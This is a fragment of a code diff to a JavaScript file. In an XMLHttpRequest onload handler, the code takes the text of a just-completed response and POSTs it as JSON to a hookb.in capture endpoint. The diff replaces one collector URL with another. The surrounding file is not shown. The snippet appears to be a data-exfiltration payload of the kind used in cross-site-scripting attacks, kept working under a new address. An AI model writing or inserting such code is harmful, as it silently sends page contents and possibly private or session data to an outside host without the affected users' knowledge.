@@ -10,7 +10,7 @@ http.onload = function () {
     if (http.readyState === http.DONE) {
         
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://hookb.in/zrWzVwxdoKhol3MMmpN0', true);
+            xhr.open('POST', 'https://hookb.in/yDwXkMKd7GiG9yjjwZ6Q', true);
             xhr.setRequestHeader('Content-type', 'application/json');
             xhr.send(JSON.stringify(http.responseText));
         
